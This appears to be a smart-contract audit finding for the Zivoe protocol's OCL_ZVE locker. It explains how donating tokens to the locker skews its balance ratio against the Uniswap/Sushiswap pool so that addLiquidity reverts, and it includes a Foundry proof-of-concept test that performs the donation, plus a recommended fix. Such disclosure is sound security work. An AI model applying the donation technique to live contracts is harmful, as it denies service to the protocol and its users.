# OCL locker balance ratio differ from Uniswap pool resulting in grief/dos attack

## Summary
OCL locker contract adds liquidity to Uniswap/Sushiswap pool by sending the whole balance it has of both tokens and it does not take into consideration the current ratio of tokens in the pool. Because of this if the ratio is off by 10% (as the protocol hardcoded - [`link`](https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/lockers/OCL/OCL_ZVE.sol#L203-L204)) the [`addLiquidity()`](https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/lockers/OCL/OCL_ZVE.sol#L198) will revert thus preventing the protocol from providing liquidity to generating yield.

## Vulnerability Detail
An attacker can always donate tokens to the locker contract and make the ratio off by enough to revert.

```solidity
...
uint balPairAsset = IERC20(pairAsset).balanceOf(address(this));
uint balZVE = IERC20(ZVE).balanceOf(address(this));
...
```

## Impact
`addLiquidity()` will revert if the provided ratio of tokens in the locker is different than the DEX pool. The ratio inside the contract is manipulatable by an attacker which increases the likelihood of this scenario.

## Code Snippet
Place the test at the bottom of Test_OCL_ZVE.sol.

```solidity
function test_OCL_ZVE_UNIV2_pushToLockerMulti_poc() public {
    uint256 amountA = 100e18; // DAI
    uint256 amountB = 100e18; // ZVE

    pushToLockerInitial_Uni(amountA, amountB, 0);

    address[] memory assets = new address[](2);
    uint256[] memory amounts = new uint256[](2);

    assets[0] = DAI;
    assets[1] = address(ZVE);

    amounts[0] = amountA;
    amounts[1] = amountB;

    /* Donate start: Donate to the locker to break the ration between the pool and the locker */
    address player = makeAddr("Nick_the_breaker");
    hevm.startPrank(player);
    mint("DAI", player, 15e18);
    IERC20(assets[0]).transfer(address(OCL_ZVE_UNIV2_DAI), 15e18);
    hevm.stopPrank();
    /* Donate end */

    bool result = god.try_pushMulti(address(DAO), address(OCL_ZVE_UNIV2_DAI), assets, amounts, new bytes[](2));

    assertEq(result, false);
}
```

## Tool used

Manual Review

## Recommendation
Do not take the balance of the locker to add liquidity to Uniswap/Sushiswap but instead pass the amounts via input parameters.
